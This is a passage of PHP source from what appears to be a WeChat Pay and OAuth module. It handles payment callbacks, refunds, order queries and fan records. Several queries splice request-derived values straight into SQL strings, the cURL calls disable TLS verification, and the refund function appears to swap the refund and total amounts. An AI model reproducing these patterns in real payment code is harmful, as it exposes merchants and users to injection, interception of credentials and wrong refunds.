                $order = pdo_fetch("SELECT * FROM " . tablename($this->ordertable) . " WHERE  uniacid = '{$_W['uniacid']}' and orderno ='{$orderno}'");
                if ($order['state'] == 0) {
                    pdo_update($this->ordertable, array(
                        'state' => 1,
                        'paytime' => date("Y-m-d H:i:s")
                    ), array(
                        'id' => $order['id']
                    ));
                    $system = $this->module['config'];
                    if ($system['isreward'] == 1 && $system['noticeopen'] == 2 && $order['type'] == 'reward') {
                        $content = '打赏了您' . $order['fee'] . '元。';
                        $this->sendNotice($order['sectionid'], $order['sopenid'], $order['nickname'], $content);
                    }
                    if ($system['noticeopen'] == 2 && $order['type'] == 'sell') {
                        $content = '订单号' . $order['orderno'] . ',已支付' . $order['fee'] . '元。';
                        $this->sendNoticeBuy($order['sectionid'], $order['openid'], $order['nickname'], $content);
                    }
                }
                $url = $_W['siteroot'] . 'app/' . $this->createMobileUrl('sdetail', array(
                    'sectionid' => $order['sectionid']
                ));
                if ($order['sectionid'] <= 0) {
                    $url = $_W['siteroot'] . 'app/' . $this->createMobileUrl('home', array(
                        'fansid' => $order['sfansid']
                    ));
                }
                $result['errcode'] = 0;
                $result['msg']     = '支付成功，感谢支持';
                $result['url']     = $url;
            } else {
                $result['errcode'] = 1;
                $result['errmsg']  = $checkresult['errmsg'];
            }
        }
        return $result;
    }
    public function refund($orderno, $orderfee, $refundfee)
    {
        global $_W;
        $system = $this->module['config'];
        $url    = "https://api.mch.weixin.qq.com/secapi/pay/refund";
        $random = random(8);
        $post   = array(
            'appid' => $system['appid'],
            'mch_id' => $system['mchid'],
            'nonce_str' => $random,
            'op_user_id' => $system['mchid'],
            'out_refund_no' => $this->getMillisecond(),
            'out_trade_no' => $orderno,
            'refund_fee' => $orderfee * 100,
            'total_fee' => $refundfee * 100
        );
        ksort($post);
        $string = $this->ToUrlParams($post);
        $string .= "&key={$system['apikey']}";
        $sign         = md5($string);
        $post['sign'] = strtoupper($sign);
        $resp         = $this->postXmlCurl($this->ToXml($post), $url, true);
        libxml_disable_entity_loader(true);
        $resp = json_decode(json_encode(simplexml_load_string($resp, 'SimpleXMLElement', LIBXML_NOCDATA)), true);
        if ($resp['return_code'] == 'SUCCESS') {
            if ($resp['result_code'] == 'SUCCESS') {
                return array(
                    'errcode' => 0,
                    'fee' => $resp['refund_fee'] / 100
                );
            } else {
                return array(
                    'errcode' => 1,
                    'errmsg' => '退款失败' . $resp['err_code'] . $resp['err_code_des']
                );
            }
        } else {
            return array(
                'errcode' => 1,
                'errmsg' => '退款失败:' . $resp['return_msg']
            );
        }
    }
    private function checkWechatTranByOrderNo($orderno)
    {
        global $_W;
        $system = $this->module['config'];
        $url    = "https://api.mch.weixin.qq.com/pay/orderquery";
        $random = random(8);
        $post   = array(
            'appid' => $system['appid'],
            'out_trade_no' => $orderno,
            'nonce_str' => $random,
            'mch_id' => $system['mchid']
        );
        ksort($post);
        $string = $this->ToUrlParams($post);
        $string .= "&key={$system['apikey']}";
        $sign         = md5($string);
        $post['sign'] = strtoupper($sign);
        $resp         = $this->postXmlCurl($this->ToXml($post), $url);
        libxml_disable_entity_loader(true);
        $resp = json_decode(json_encode(simplexml_load_string($resp, 'SimpleXMLElement', LIBXML_NOCDATA)), true);
        if ($resp['return_code'] == 'SUCCESS') {
            if ($resp['result_code'] == 'SUCCESS') {
                if ($resp['trade_state'] == 'SUCCESS') {
                    return array(
                        'errcode' => 0,
                        'fee' => $resp['total_fee'] / 100
                    );
                } else {
                    return array(
                        'errcode' => 1,
                        'errmsg' => '未支付:' . $resp['trade_state']
                    );
                }
            } else {
                return array(
                    'errcode' => 1,
                    'errmsg' => '订单不存在' . $resp['err_code']
                );
            }
        } else {
            return array(
                'errcode' => 1,
                'errmsg' => '查询失败:' . $resp['return_msg']
            );
        }
    }
    private function unifiedOrder($fans, $array, $desc, $fee)
    {
        global $_W;
        $system     = $this->module['config'];
        $url        = "https://api.mch.weixin.qq.com/pay/unifiedorder";
        $random     = random(8);
        $orderno    = $this->getMillisecond();
        $trade_type = 'JSAPI';
        if ($system['auth'] == 1) {
            $trade_type = 'NATIVE';
        }
        $post = array(
            'appid' => $system['appid'],
            'mch_id' => $system['mchid'],
            'nonce_str' => $random,
            'body' => $desc,
            'out_trade_no' => $orderno,
            'total_fee' => $fee * 100,
            'spbill_create_ip' => $system['ip'],
            'notify_url' => 'http://' . $_SERVER['HTTP_HOST'] . '/payment/wechat/pay.php',
            'trade_type' => $trade_type,
            'openid' => $fans['openid']
        );
        ksort($post);
        $string = $this->ToUrlParams($post);
        $string .= "&key={$system['apikey']}";
        $sign         = md5($string);
        $post['sign'] = strtoupper($sign);
        $resp         = $this->postXmlCurl($this->ToXml($post), $url);
        libxml_disable_entity_loader(true);
        $resp = json_decode(json_encode(simplexml_load_string($resp, 'SimpleXMLElement', LIBXML_NOCDATA)), true);
        if ($resp['result_code'] != 'SUCCESS') {
            return array(
                'errcode' => 1,
                'errmsg' => $resp['return_msg']
            );
        } else {
            $orderid = $this->addCharge($fans, $array, $post);
            return array(
                'errcode' => 0,
                'prepay_id' => $resp['prepay_id'],
                'code_url' => $resp['code_url'],
                'orderno' => $orderno,
                'orderid' => $orderid
            );
        }
    }
    private function addCharge($fans, $array, $post)
    {
        global $_W;
        $fee       = $post['total_fee'] / 100;
        $sectionid = $array['sectionid'];
        $thefansid = $array['thefansid'];
        $type      = $array['type'];
        $fansid    = 0;
        $openid    = '';
        if ($sectionid > 0) {
            $section = pdo_fetch("SELECT fansid,openid FROM " . tablename($this->sectiontable) . " WHERE id = '{$sectionid}'");
            $fansid  = $section['fansid'];
            $openid  = $section['openid'];
        } else {
            $thefans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id ='{$thefansid}'");
            $fansid  = $thefans['id'];
            $openid  = $thefans['openid'];
        }
        $data = array(
            'uniacid' => $_W['uniacid'],
            'orderno' => $post['out_trade_no'],
            'type' => $type,
            'sectionid' => $sectionid,
            'sfansid' => $fansid,
            'sopenid' => $openid,
            'fee' => $fee,
            'fansid' => $fans['id'],
            'openid' => $fans['openid'],
            'nickname' => $fans['nickname'],
            'headimgurl' => $fans['headimgurl'],
            'addtime' => date("Y-m-d H:i:s")
        );
        pdo_insert($this->ordertable, $data);
        $orderid = pdo_insertid();
        return $orderid;
    }
    private function getWxPayJsParams($prepay_id)
    {
        global $_W;
        $system = $this->module['config'];
        $random = random(8);
        $post   = array(
            'appId' => $system['appid'],
            'timeStamp' => time(),
            'nonceStr' => $random,
            'package' => "prepay_id=" . $prepay_id,
            'signType' => 'MD5'
        );
        ksort($post);
        $string = $this->ToUrlParams($post);
        $string .= "&key={$system['apikey']}";
        $sign            = md5($string);
        $post['paySign'] = strtoupper($sign);
        return $post;
    }
    public function getFansDBInfo($openid)
    {
        global $_W;
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE uniacid = '{$_W['uniacid']}' and openid ='{$openid}'");
        return $fans;
    }
    public function checkinfo()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        if ($system['auth'] == 0) {
            $openid = $_W['fans']['from_user'];
            $fans   = $this->getFansDBInfo($openid);
            if (empty($fans)) {
                $authuser = $this->authUser();
                $fans     = $this->addFans($authuser);
            }
        } else {
            $openid = $_SESSION['water_live_authpenid'];
            if (empty($openid)) {
                $authuser = $this->authUser();
                $openid   = $authuser['openid'];
                $fans     = $this->getFansDBInfo($openid);
                if (empty($fans)) {
                    $fans = $this->addFans($authuser);
                }
                $_SESSION['water_live_authpenid'] = $fans['openid'];
            } else {
                $fans = $this->getFansDBInfo($openid);
            }
        }
        return $fans;
    }
    public function checkopenid()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        if ($system['auth'] == 0) {
            $openid = $_W['fans']['from_user'];
        } else {
            $openid = $_SESSION['water_live_authpenid'];
            if (empty($openid)) {
                $openid                           = $this->authOpenid();
                $_SESSION['water_live_authpenid'] = $openid;
            }
        }
        return $openid;
    }
    public function authOpenid()
    {
        global $_GPC, $_W;
        $host = $this->module['config']['domain'];
        if (empty($host)) {
            $host = $_SERVER['HTTP_HOST'];
        }
        if (!isset($_GPC['code'])) {
            $baseUrl = 'http://' . $host . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
            $baseUrl = urlencode($baseUrl);
            $url     = $this->__CreateOauthUrlForCode($baseUrl, "snsapi_base");
            Header("Location:{$url}");
            die;
        } else {
            $code = $_GPC['code'];
            $base = $this->getBaseFromMp($code);
            return $base['openid'];
        }
    }
    public function authUser()
    {
        global $_GPC, $_W;
        $host = $this->module['config']['domain'];
        if (empty($host)) {
            $host = $_SERVER['HTTP_HOST'];
        }
        if (!isset($_GPC['code'])) {
            $baseUrl = urlencode('http://' . $host . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING']);
            $url     = $this->__CreateOauthUrlForCode($baseUrl, "snsapi_userinfo");
            Header("Location: {$url}");
            die;
        } else {
            $code = $_GPC['code'];
            $base = $this->getBaseFromMp($code);
            $user = $this->getUserInfoFromMp($base);
            return $user;
        }
    }
    private function __CreateOauthUrlForCode($redirectUrl, $scope)
    {
        global $_W;
        $system                  = $this->module['config'];
        $urlObj["appid"]         = $system['appid'];
        $urlObj["redirect_uri"]  = "{$redirectUrl}";
        $urlObj["response_type"] = "code";
        $urlObj["scope"]         = "{$scope}";
        $urlObj["state"]         = "STATE" . "#wechat_redirect";
        $bizString               = $this->ToUrlParams($urlObj);
        return "https://open.weixin.qq.com/connect/oauth2/authorize?" . $bizString;
    }
    public function getBaseFromMp($code)
    {
        $url = $this->__CreateOauthUrlForOpenid($code);
        $ch  = curl_init();
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $res = curl_exec($ch);
        curl_close($ch);
        $data                 = json_decode($res, true);
        $base                 = array();
        $base['openid']       = $data['openid'];
        $base['access_token'] = $data['access_token'];
        return $base;
    }
    public function getUserInfoFromMp($base)
    {
        $url = $this->__CreateOauthUrlForUserInfo($base);
        $ch  = curl_init();
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $res = curl_exec($ch);
        curl_close($ch);
        $data = json_decode($res, true);
        return $data;
    }
    private function __CreateOauthUrlForOpenid($code)
    {
        global $_W;
        $system               = $this->module['config'];
        $urlObj["appid"]      = $system['appid'];
        $urlObj["secret"]     = $system['secret'];
        $urlObj["code"]       = $code;
        $urlObj["grant_type"] = "authorization_code";
        $bizString            = $this->ToUrlParams($urlObj);
        return "https://api.weixin.qq.com/sns/oauth2/access_token?" . $bizString;
    }
    private function __CreateOauthUrlForUserInfo($base)
    {
        global $_W;
        $urlObj["access_token"] = $base['access_token'];
        $urlObj["openid"]       = $base['openid'];
        $bizString              = $this->ToUrlParams($urlObj);
        return "https://api.weixin.qq.com/sns/userinfo?" . $bizString;
    }
    private function addFans($info)
    {
        global $_W;
        $data = array();
        if (!empty($info['nickname']) && !empty($info['openid'])) {
            $data    = array(
                'uniacid' => $_W['uniacid'],
                'openid' => $info['openid'],
                'nickname' => $info['nickname'],
                'headimgurl' => $info['headimgurl'],
                'sex' => $info['sex'],
                'addtime' => date("Y-m-d H:i:s")
            );
            $flag    = $_W['uniacid'] . $info['openid'];
            $addfans = $_SESSION['water_live_addfans'];
            if (empty($addfans) || $addfans != $flag) {
                $_SESSION['water_live_addfans'] = $flag;
                pdo_insert($this->fanstable, $data);
                $fansid = pdo_insertid();
            }
        }
        return $data;
    }
}
